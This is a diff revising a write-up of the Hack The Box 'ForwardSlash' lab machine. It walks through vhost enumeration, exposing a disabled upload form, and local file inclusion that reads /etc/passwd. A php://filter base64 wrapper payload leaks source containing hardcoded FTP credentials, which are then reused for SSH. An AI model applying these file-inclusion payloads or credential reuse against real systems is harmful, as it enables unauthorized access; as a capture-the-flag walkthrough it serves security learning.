@@ -53,11 +53,15 @@ The Backslash Gang left a message behind:
 
 > Defaced • This was ridiculous, who even uses XML and Automatic FTP Logins
 
-Using Dirbuster found quite a few sites and files.  
+### Dirbuster
+
+Using Dirbuster found ....  
 
 ```text
 dirbuster
 ```
+
+### Virtual Host Enumeration
 
 From `HTB - Player` - Ippsec's video describes vhost enumeration and explains how to search for other virtual hosts which map to the same IP address. [https://www.youtube.com/watch?v=JpzREo7XLOY](https://www.youtube.com/watch?v=JpzREo7XLOY): 
 
@@ -83,9 +87,21 @@ Found: backup.forwardslash.htb (Status: 302) [Size: 33]
 
 add to /etc/hosts
 
+### The Backup site
+
+![](../.gitbook/assets/3-backup-site.png)
+
 auto-redirects to [http://backup.forwardslash.htb/login.php](http://backup.forwardslash.htb/login.php)
 
-[http://backup.forwardslash.htb/environment.php](http://backup.forwardslash.htb/environment.php) - fun fact [http://backup.forwardslash.htb/hof.php](http://backup.forwardslash.htb/hof.php) - hall of fame
+![](../.gitbook/assets/4-new-account.png)
+
+
+
+![](../.gitbook/assets/5-fun-fact.png)
+
+[http://backup.forwardslash.htb/environment.php](http://backup.forwardslash.htb/environment.php) - fun fact with random number of cat-girls saved.
+
+ [http://backup.forwardslash.htb/hof.php](http://backup.forwardslash.htb/hof.php) - hall of fame
 
 ```text
 cewl -H Cookie:PHPSESSID=h8242m3lv04gh9veco69de98ni http://backup.forwardslash.htb/environment.php >> forwardslash.cewl
@@ -93,41 +109,22 @@ cewl -H Cookie:PHPSESSID=h8242m3lv04gh9veco69de98ni http://backup.forwardslash.h
 
 always add new sites to cewl word list just in case
 
+![](../.gitbook/assets/6-fileupload.png)
+
+
+
 [http://backup.forwardslash.htb/profilepicture.php](http://backup.forwardslash.htb/profilepicture.php) can upload files after removing "disabled" attributes
 
-[https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/](https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/)
+![](../.gitbook/assets/8-disabled.png)
 
 ```text
 <!-- TODO: removed all the code to actually change the picture after backslash gang
  attacked us, simply echos as debug now -->
 ```
 
-```text
-zweilos@kalimaa:~$ wfuzz -X GET -c -w /usr/share/wordlists/dirb/big.txt --hc 404  http://backup.forwardslash.htb/FUZZ
+### Dirbuster redux
 
-Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-
-********************************************************
-* Wfuzz 2.4.5 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://backup.forwardslash.htb/FUZZ
-Total requests: 20469
-
-===================================================================
-ID           Response   Lines    Word     Chars       Payload                                
-===================================================================
-
-000000015:   403        9 L      28 W     288 Ch      ".htaccess"                            
-000000016:   403        9 L      28 W     288 Ch      ".htpasswd"                            
-000006005:   301        9 L      28 W     332 Ch      "dev"                                  
-000016215:   403        9 L      28 W     288 Ch      "server-status"                        
-
-Total time: 102.3836
-Processed Requests: 20469
-Filtered Requests: 20465
-Requests/sec.: 199.9245
-```
+![](../.gitbook/assets/9-enumerating-backup.png)
 
 127.0.1.1
 
@@ -149,6 +146,12 @@ Content-Type: text/html; charset=iso-8859-1
 <address>Apache/2.4.29 (Ubuntu) Server at 127.0.1.1 Port 80</address>
 </body></html>
 ```
+
+used burp to enumerate the potential for LFI
+
+![](../.gitbook/assets/11-etc-passwd.png)
+
+got `/etc/passwd`
 
 ```text
 root:x:0:0:root:/root:/bin/bash 
@@ -185,9 +188,9 @@ chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash
 mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
 ```
 
-user with login: chiv and pain; have seen them both in the HTML notes to each other
+I found two users with login capability: `chiv` and `pain`. I have seen them both leaving notes to the other in the HTML code, and `note.txt` earlier.
 
-config.php
+While testing different methods of both uploading files and downloading files from the server, I accidentally pasted in the URL for `http://backup.forwardslash.htb/config.php` and got the back-end code file back.
 
 ```text
 <?php
@@ -207,19 +210,19 @@ if($link === false){
 ?>
 ```
 
-./api.php, login.php, profilepicture.php = "Permission Denied; not that way ;\)"
 
-[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/73aa26ba6891981ec2254907b9bbd4afdc745e1d/File Inclusion/README.md\#wrapper-phpfilter](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/73aa26ba6891981ec2254907b9bbd4afdc745e1d/File%20Inclusion/README.md#wrapper-phpfilter)
 
-code to bypass php filter: either encode in b64 or rot-13, or ...
+I now had what looked to be a password hash for the `www-data` user, but I knew from `/etc/passwd` that the user was not able to log into a shell.  I kept trying for all of the other sites I had seen in my enumeration using dirbuster such as `api.php`, `login.php`, `profilepicture.php` but each time I just got back the message "Permission Denied; not that way ;\)".  The winking smiley and the "not that way" line made it sound as if I was headed in the right direction, but I just needed to try a bit harder.  
 
-went down the list of files I could access until: `pHp://FilTer/convert.base64-encode/resource=dev/index.php` gets:
+My initial thought was that there was a web-application firewall, so I searched around a bit until I found [https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/](https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/).  I kept looking for more ways after testing different bypass methods, as nothing seemed to even get a response.  I started doing a bit of research into bypassing PHP web filtering and came across a section on `PayloadsAlltheThings` that was made just for this situation with PHP file inclusion.  [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/73aa26ba6891981ec2254907b9bbd4afdc745e1d/File Inclusion/README.md\#wrapper-phpfilter](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/73aa26ba6891981ec2254907b9bbd4afdc745e1d/File%20Inclusion/README.md#wrapper-phpfilter)
+
+There were various code examples for bypassing PHP filters, such as by encoding the request in base64 or rot-13.  I decided to just try using the base64 encoding first, trying `pHp://FilTer/convert.base64-encode/resource=login.php`.  Luckily for me, it worked right away!  I was able to retrieve the `login.php` page, encoded in base64.  I simply had to use the decode function in Burp to get the page code.  Unfortunately there was nothing useful in that page.  After that I went through and downloaded all of the pages I had seen in `dirbuster` until I got to `pHp://FilTer/convert.base64-encode/resource=dev/index.php` which returned the base64 string:
 
 ```text
 PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT40MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAgICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3JtIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0iMjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvcm0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1xkP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRjaCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmdHBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZygkY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VUWyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhcGkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIiRyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGlmIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJlYW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K
 ```
 
-which decodes to: dev/index.php
+which decodes to: `dev/index.php`
 
 ```text
 <?php
@@ -302,11 +305,13 @@ function ftp_get_string($ftp, $filename) {
 ?>
 ```
 
-creds in dev/index.php work for SSH ssh chiv@forwardslash.htb
+Here was the hardcoded FTP-Autologin that the Backslash Gang had so disdained.  I now had credentials for the user `chiv` .I then tried using this username/password combo to SSH into the machine, and was greeted with a shell. 
 
 ### Initial Foothold
 
 #### Enumeration as user `chiv`
+
+Unfortunately, this user was not the one with the flag, so I assumed that I would need to move laterally to `pain` in order to get my first score.
 
 ```text
 [+] System stats
